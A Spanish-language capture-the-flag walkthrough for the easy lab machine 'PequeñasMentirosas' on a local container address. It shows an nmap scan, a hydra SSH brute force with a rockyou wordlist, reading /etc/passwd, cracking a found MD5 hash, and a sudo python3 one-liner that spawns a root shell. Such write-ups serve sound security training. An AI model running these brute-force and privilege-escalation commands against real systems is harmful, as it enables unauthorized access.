Maquina: PequeñasMentirosas

Autor: Beafn28

Dificultad: Facil

![Captura de pantalla 2024-11-29 174813](https://github.com/user-attachments/assets/56fb34a8-6dfa-4b9b-8e73-c70ef6442837)

Realizamos un ping a la máquina para verificar la comunicación.
ping 172.17.0.2 -c 1

![Captura de pantalla 2024-11-29 175853](https://github.com/user-attachments/assets/33a60e2d-d9ec-4062-9c83-d19ee6eddb0c)

Escaneamos con Nmap.
sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

![Captura de pantalla 2024-11-29 175932](https://github.com/user-attachments/assets/4580f42b-fe70-41da-92d8-8a481717e3bd)

Observamos que el puerto 80 y 22 estan abiertos.

Accedemos a la página web alojada en esta máquina utilizando un navegador y vemos un posible usuario.

![Captura de pantalla 2024-11-29 180032](https://github.com/user-attachments/assets/0404962e-8e12-4d75-9b21-f783b0268be7)

Usamos hydra.

hydra -l "a" -P /home/ankb/Documents/rockyou.txt ssh://172.17.0.2 

![Captura de pantalla 2024-11-29 190301](https://github.com/user-attachments/assets/cff93c97-d95d-4c76-abda-823858c1a5a2)

Encontramos la contrasena para el usuario y entramos por ssh.

ssh a@172.17.0.2

secret

![Captura de pantalla 2024-11-29 190409](https://github.com/user-attachments/assets/458840c4-d87d-4352-ae02-f553a56cf52e)

Si vemos los usuarios que existen, encontramos spencer.

![Captura de pantalla 2024-11-29 190429](https://github.com/user-attachments/assets/bd353c9c-0fbd-46e6-8517-18516cd09942)

cat /etc/passwd | grep "sh$"

![Captura de pantalla 2024-11-29 190429](https://github.com/user-attachments/assets/68816350-a0e8-4bfe-8f00-016a67dc1dab)

Hacemos una busqueda de archivos .txt de la siguiente manera 

find / -name *.txt 2>/dev/null

![Captura de pantalla 2024-11-29 190546](https://github.com/user-attachments/assets/98ddba2f-faf8-422d-a684-4976b685a6e4)

cat /srv/ftp/hash_spencer.txt

![Captura de pantalla 2024-11-29 190716](https://github.com/user-attachments/assets/76bc252d-d9fe-497f-89a9-f6047f6634ee)

Encontramos con un hash en MD5, usamos CrackStation y nos da la contrasena: password1

![Captura de pantalla 2024-11-29 190825](https://github.com/user-attachments/assets/e3357b55-3e0f-4ae2-b541-42b9e7489018)

Cambiamos al usuario spencer

su spencer

password1

![Captura de pantalla 2024-11-29 190920](https://github.com/user-attachments/assets/9d8e8590-9fa2-43e8-abb1-d3bb4a3bc461)

sudo -l

Con este usuario veremos que podemos ejecutar el binario de /usr/bin/python3 como cualquier usuario sin propocionar contraseña.

![Captura de pantalla 2024-11-29 190935](https://github.com/user-attachments/assets/804d585f-a456-4c13-9b1e-aa812ac74946)

sudo /usr/bin/python3 -c "import os; os.system('/bin/bash')"

whoami

![Captura de pantalla 2024-11-29 191000](https://github.com/user-attachments/assets/17ad5d4f-e989-4950-a9d0-44605ea58dfe)
